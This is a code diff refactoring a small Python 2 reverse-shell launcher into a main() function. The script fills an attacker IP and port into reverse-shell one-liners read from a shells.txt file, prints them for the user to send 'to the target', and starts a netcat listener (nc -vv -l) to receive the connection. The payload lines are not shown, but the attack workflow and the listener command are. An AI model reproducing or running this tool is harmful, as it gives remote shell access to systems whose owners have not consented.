@@ -3,18 +3,23 @@
 import re,os,sys
 from clint.textui import colored
 
-if len(sys.argv) < 3:
-	print 'Syntax Error:\npython %s ip port\nExample:\npython %s 192.168.10.1 4444' %(sys.argv[0],sys.argv[0])
-	sys.exit(-1)
 
-ipaddr,port = sys.argv[1],sys.argv[2]
-shells = os.path.join(os.path.dirname(os.path.realpath(__file__)),'shells.txt')
-for shell in open(shells):
-	desc,cmd = shell.split('|',1)
-	cmd = re.sub('\[IPADDR\]', ipaddr, cmd)
-	cmd = re.sub('\[PORT\]', port, cmd)
-	print colored.green(desc)
-	print cmd
+def main():
+	if len(sys.argv) < 3:
+		print 'Syntax Error:\npython %s ip port\nExample:\npython %s 192.168.10.1 4444' %(sys.argv[0],sys.argv[0])
+		sys.exit(-1)
 
-raw_input('Select your payload, press any key to start the nc listener and send it to the target...')
-os.system('nc -vv -l %s %s' % (ipaddr,port))
+	ipaddr,port = sys.argv[1],sys.argv[2]
+	shells = os.path.join(os.path.dirname(os.path.realpath(__file__)),'shells.txt')
+	for shell in open(shells):
+		desc,cmd = shell.split('|',1)
+		cmd = re.sub('\[IPADDR\]', ipaddr, cmd)
+		cmd = re.sub('\[PORT\]', port, cmd)
+		print colored.green(desc)
+		print cmd
+
+	raw_input('Select your payload, press any key to start the nc listener and send it to the target...')
+	os.system('nc -vv -l %s %s' % (ipaddr,port))
+
+if __name__ == "__main__":
+	main()
